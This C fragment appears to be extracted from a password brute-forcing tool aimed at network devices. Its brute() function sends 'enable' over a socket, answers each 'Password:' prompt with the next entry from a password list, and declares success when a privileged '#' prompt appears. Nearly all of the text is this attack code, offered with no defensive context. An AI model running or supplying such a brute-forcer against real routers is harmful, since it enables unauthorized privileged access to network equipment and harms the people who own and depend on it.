
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;
 char* BOX ;
 int bzero (char*,int) ;
 int exit (int ) ;
 int fflush (int ) ;
 char* malloc (int) ;
 int n ;
 char** password ;
 int printf (char*,char*,...) ;
 scalar_t__ read (int ,char*,int) ;
 int sock_stat ;
 int stdout ;
 int strlen (char*) ;
 scalar_t__ strstr (char*,char*) ;
 int write (int ,char*,int) ;
 int x ;

int brute() {

   char *input = malloc(100);
   int N;

   bzero(input,100);

   write(sock_stat,"enable",6);
   write(sock_stat,"\r\n",2);


   while(1) {

     while(read(sock_stat,input,100)>0) {
       if(n==x) { printf("%s %i passwords tried. no valid password found in the passlist\n\033[0m\n",BOX,n-1); exit(0); }
       if(n+1==x) break;
       if(strstr(input,"assword:")||strstr(input,"#")||strstr(input,">")) break;
       bzero(input,100);
     }

     if(strstr(input,"#")) { printf("%s possible password found: %s\n\033[0m\n",BOX,password[n-1]); exit(0); }

     if(strstr(input,"assword:")) {
       write(sock_stat,password[n],strlen(password[n]));
       write(sock_stat,"\r\n",2);
       n++;
       bzero(input,100);
       if(n>1) printf("%s %s... wrong password\n", BOX, password[n-2]); fflush(stdout);
       continue;
     }
     if(strstr(input,">")) {
       write(sock_stat,"enable\r\n",8); bzero(input,100);
     }
   }
}
